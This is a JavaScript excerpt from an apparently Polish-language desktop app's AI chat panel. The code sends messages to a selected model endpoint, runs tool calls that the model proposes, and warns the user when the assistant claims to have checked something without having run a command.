  const text = $("#aiText").value.trim();
  if (!text) return;

  const p = AI.providers.find((x) => x.id === $("#aiProv").value);
  const key = $("#aiKey").value.trim();
  if (p && p.klucz && !key) {
    aiBubble("err", "Wklej klucz API albo wybierz Ollama / LM Studio (lokalne, bez klucza).");
    return;
  }

  AI.busy = true;
  $("#aiSend").disabled = true;
  $("#aiText").value = "";
  aiBubble("me", text);
  const wait = aiBubble("ai", "...");
  AI.history.push({ role: "user", content: text });
  toolsRanThisTurn = false;

  try {
    const custom = p && p.id === "custom";
    const base = custom ? ($("#aiBase").value || "").trim() : AI.base;
    const model = custom
      ? ($("#aiModelName").value || "").trim()
      : (AI.model || $("#aiModel").value || "");
    if (!base) {
      wait.remove();
      aiBubble("err", "Podaj adres endpointu.");
      AI.busy = false; $("#aiSend").disabled = false;
      return;
    }
    if (!model) {
      wait.remove();
      aiBubble("err", "Podaj nazwe modelu.");
      AI.busy = false; $("#aiSend").disabled = false;
      return;
    }
    const r = await invoke("ai_chat", {
      req: { base: base, api_key: key, model: model, messages: AI.history, context: AI.context },
    });
    wait.remove();
    if (r.error) {
      aiBubble("err", explainApiError(r.error));
    } else {
      // --- kontrola spojnosci: obietnica bez wykonania ---
      if (hasUnverifiedClaim(r.tresc, toolsRanThisTurn)) {
        aiBubble("warn",
          "⚠ Asystent twierdzi, że coś sprawdził, ale w tej turze nie uruchomił żadnej komendy. " +
          "Poniżej może być odpowiedź oparta na domysłach, nie na Twoim systemie. " +
          "Kliknij ponownie, jeśli chcesz, żeby faktycznie coś przetestował.");
      }
      aiBubble("ai", r.tresc);
      AI.history.push({ role: "assistant", content: r.tresc });

      // wykryj propozycje narzedzi
      let calls = [];
      try {
        const p = await invoke("agent_parse_calls", { text: r.tresc });
        calls = p.calls || [];
      } catch {}
      if (calls.length) {
        AI.busy = false;
        $("#aiSend").disabled = false;
        toolsRanThisTurn = true;
        await renderCalls(calls);

        // po wykonaniu wrzucamy wyniki do rozmowy i prosimy o podsumowanie
        if (agentResults.length) {
          const joined = agentResults.join("\n\n");
          agentResults = [];
          AI.history.push({ role: "user", content: "Wyniki wykonanych akcji:\n" + joined + "\n\nPodsumuj wyniki dla użytkownika." });
          const w2 = aiBubble("ai", "…");
          try {
            const r2 = await invoke("ai_chat", {
              req: { base: AI.base, api_key: key, model: model, messages: AI.history, context: AI.context },
            });
            w2.remove();
            if (r2.error) aiBubble("err", explainApiError(r2.error));
            else {
              aiBubble("ai", r2.tresc);
              AI.history.push({ role: "assistant", content: r2.tresc });
            }
          } catch (e) {
            w2.remove();
            aiBubble("err", (e && e.message) || String(e));
          }
        }
      }
    }
  } catch (e) {
    wait.remove();
    aiBubble("err", (e && e.message) || String(e));
  } finally {
    AI.busy = false;
    $("#aiSend").disabled = false;
  }
}

/* ---------- start ---------- */
if (invoke) renderCards();

function showVp() {
  const el = $("#vpInfo");
  if (el) el.textContent = `| ${innerWidth}x${innerHeight} @${devicePixelRatio}x`;
}
showVp();
addEventListener("resize", showVp);
